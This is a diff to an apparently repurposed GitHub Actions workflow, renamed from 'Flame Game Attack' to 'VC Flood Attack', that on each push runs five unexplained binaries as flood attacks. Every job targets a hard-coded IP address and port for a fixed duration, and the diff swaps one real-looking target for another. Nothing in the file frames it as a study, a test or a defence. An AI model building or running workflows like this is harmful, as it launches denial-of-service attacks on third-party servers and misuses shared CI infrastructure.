@@ -1,4 +1,4 @@
-name: Flame Game Attack
+name: VC Flood Attack
 on: [push]
 
 jobs:
@@ -13,7 +13,7 @@ jobs:
     - name: Make soul executable and run attack
       run: |
         chmod +x soul
-        ./soul 4.247.19.103 14596 300
+        ./soul 91.108.17.52 32001 60
 
   flame_attack:
     runs-on: ubuntu-22.04
@@ -26,7 +26,7 @@ jobs:
     - name: Make flame executable and run attack
       run: |
         chmod +x flame
-        ./flame 4.247.19.103 14596 300
+        ./flame 91.108.17.52 32001 60
 
   soulcracks_attack:
     runs-on: ubuntu-22.04
@@ -38,7 +38,7 @@ jobs:
     - name: Make soulcracks executable and run attack
       run: |
         chmod +x soulcracks
-        ./soulcracks 4.247.19.103 14596 300 ${{ matrix.n }}
+        ./soulcracks 91.108.17.52 32001 60 ${{ matrix.n }}
 
   vishal_attack:
     runs-on: ubuntu-22.04
@@ -51,7 +51,7 @@ jobs:
     - name: Make vishal executable and run attack
       run: |
         chmod +x vishal
-        ./vishal 4.247.19.103 14596 300
+        ./vishal 91.108.17.52 32001 60
 
   fuck_attack:
     runs-on: ubuntu-22.04
@@ -63,5 +63,5 @@ jobs:
     - name: Make fuck executable and run attack
       run: |
         chmod +x fuck
-        ./fuck 4.247.19.103 14596 300 ${{ matrix.n }}
+        ./fuck 91.108.17.52 32001 60 ${{ matrix.n }}
 
